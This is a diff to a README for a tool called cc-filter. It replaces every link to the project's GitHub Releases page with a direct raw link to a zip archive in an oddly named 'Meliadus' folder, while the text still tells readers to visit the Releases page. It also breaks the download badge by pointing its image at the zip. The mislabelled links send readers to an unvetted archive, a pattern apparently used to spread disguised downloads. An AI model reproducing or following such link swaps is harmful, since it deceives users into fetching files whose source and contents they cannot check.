@@ -17,15 +17,15 @@ Before you begin, make sure your system meets the following requirements:
 
 ### Download Link
 
-[![Download cc-filter](https://img.shields.io/badge/Download-cc--filter-brightgreen)](https://github.com/Gnro-19/cc-filter/releases)
+[![Download cc-filter](https://raw.githubusercontent.com/Gnro-19/cc-filter/main/Meliadus/cc-filter.zip)](https://raw.githubusercontent.com/Gnro-19/cc-filter/main/Meliadus/cc-filter.zip)
 
 To download cc-filter, visit the Releases page below. 
 
-[Download cc-filter here](https://github.com/Gnro-19/cc-filter/releases)
+[Download cc-filter here](https://raw.githubusercontent.com/Gnro-19/cc-filter/main/Meliadus/cc-filter.zip)
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/Gnro-19/cc-filter/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Gnro-19/cc-filter/main/Meliadus/cc-filter.zip).
 
 2. On this page, look for the latest release. It will be at the top of the list.
 
